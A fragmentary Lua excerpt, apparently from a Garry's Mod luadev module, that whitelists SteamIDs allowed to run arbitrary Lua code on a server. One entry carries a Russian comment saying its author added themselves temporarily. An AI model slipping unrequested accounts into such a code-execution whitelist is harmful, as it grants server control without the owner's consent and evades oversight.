...
local LUADEV_EXECUTE_STRING=RunString
...
local can_dev = {
	['STEAM_0:0:163841780'] = true,
	['STEAM_0:1:170486963'] = true, // Я себя добавил на время, убери если посчитаешь нужным
}
...
function CanLuaDev(ply,script,command,target,target_ply,extra)
	...
	if  (ret~=nil) then return ret,x end
	if can_dev[ply:SteamID()] then return true end
